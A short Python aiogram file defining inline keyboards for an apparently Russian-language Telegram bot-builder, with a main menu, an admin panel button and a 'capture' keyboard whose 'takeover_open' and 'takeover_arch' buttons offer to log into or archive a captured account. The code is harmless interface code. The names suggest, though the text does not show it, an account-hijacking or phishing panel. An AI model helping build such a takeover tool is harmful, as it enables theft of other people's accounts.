from aiogram.types import InlineKeyboardMarkup
from aiogram.utils.keyboard import InlineKeyboardBuilder

def main_menu(is_admin=False):
    kb = InlineKeyboardBuilder()
    kb.button(text="👤 Мой профиль", callback_data="profile")
    kb.button(text="🤖 Мои боты", callback_data="my_bots")
    kb.button(text="➕ Создать бота", callback_data="create_bot")
    kb.button(text="📊 Статистика", callback_data="stats")
    if is_admin:
        kb.button(text="⚙️ Админ-панель", callback_data="admin_panel")
    kb.button(text="ℹ️ О проекте", callback_data="about")
    kb.adjust(2, 2, 2 if is_admin else 1, 1)
    return kb.as_markup()

def back_menu():
    kb = InlineKeyboardBuilder()
    kb.button(text="◀️ В главное меню", callback_data="main_menu")
    return kb.as_markup()

def capture_keyboard(cap_id: int):
    kb = InlineKeyboardBuilder()
    kb.button(text="🔓 Войти в аккаунт", callback_data=f"takeover_open:{cap_id}")
    kb.button(text="🗄 В архив", callback_data=f"takeover_arch:{cap_id}")
    kb.adjust(1)
    return kb.as_markup()
